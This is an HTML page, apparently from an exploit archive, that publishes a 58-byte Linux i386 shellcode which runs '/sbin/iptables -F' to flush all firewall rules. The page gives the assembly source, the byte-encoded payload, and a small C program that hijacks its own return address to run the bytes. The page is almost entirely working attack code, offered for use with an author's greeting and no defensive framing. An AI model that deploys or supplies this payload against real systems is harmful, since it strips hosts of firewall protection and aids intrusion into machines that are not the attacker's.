<html><head><title>Linux/x86 - iptables -F - 58 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* The shellcode flushs the iptables  by running /sbin/iptables -F
   no exit()
   greetz to zilion: man, my code is shorter!

   size = 58 bytes 
   OS	= Linux i386
 		written by /rootteam/dev0id (www.sysworld.net)
 

BITS	32

jmp	short	callme
main:
	pop	esi
	xor	eax,eax
	mov byte [esi+14],al
	mov byte [esi+17],al
	mov long [esi+18],esi
	lea	 ebx,[esi+15]
	mov long [esi+22],ebx
	mov long [esi+26],eax
	mov 	al,0x0b
	mov	ebx,esi
	lea	ecx,[esi+18]
	lea	edx,[esi+26]
	int	0x80
	

callme:
	call	main
	db '/sbin/iptables#-F#'
*/


char shellcode[] =
	&quot;\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d&quot;
	&quot;\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12&quot;
	&quot;\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e&quot;
	&quot;\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x23\x2d\x46\x23&quot;;

	
int main()
{

  int *ret;
  ret = (int *)&amp;ret + 2;
  (*ret) = (int)shellcode;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
